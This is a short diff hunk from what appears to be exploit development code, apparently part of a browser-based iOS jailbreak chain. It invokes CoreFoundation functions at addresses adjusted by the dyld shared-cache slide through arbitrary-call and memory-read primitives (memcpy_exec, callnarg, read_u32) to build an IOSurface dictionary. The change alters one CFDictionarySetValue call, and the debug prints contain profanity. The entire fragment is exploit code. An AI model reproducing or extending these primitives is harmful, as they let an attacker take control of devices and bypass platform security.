@@ -38,7 +38,7 @@ function memcpy_exec(dst, src, size) {
 	printf("fuck you test=%p %p %p\n", test, pitch, read_u32(dict));
 	scall("printf", "%x %x %x %x\n", read_u32(CFDictionarySetValue_addr + get_dyld_shc_slide()), read_u32(CFDictionarySetValue_addr + get_dyld_shc_slide() + 4), read_u32(CFDictionarySetValue_addr + get_dyld_shc_slide() + 8), read_u32(CFDictionarySetValue_addr + get_dyld_shc_slide() + 12));
 	callnarg(CFShow_addr + get_dyld_shc_slide(), dict);
-	callnarg(CFDictionarySetValue_addr + get_dyld_shc_slide(), dict, read_u32(my_kIOSurfaceBytesPerRow), read_u32(my_kIOSurfaceBytesPerRow + 4), read_u32(my_kIOSurfaceBytesPerRow + 8), read_u32(my_kIOSurfaceBytesPerRow + 12), test);
+	call4arg(CFDictionarySetValue_addr + get_dyld_shc_slide(), dict, read_u32(read_u32(my_kIOSurfaceBytesPerRow)), test, 0);
 	printf("fuck1\n");
 	callnarg(CFDictionarySetValue_addr + get_dyld_shc_slide(), dict, read_u32(my_kIOSurfaceWidth), read_u32(my_kIOSurfaceWidth + 4), read_u32(my_kIOSurfaceWidth + 8), read_u32(my_kIOSurfaceWidth + 12), callnarg(CFNumberCreate_addr + get_dyld_shc_slide(), 0, kCFNumberSInt32Type, width));
 	printf("fuck2\n");
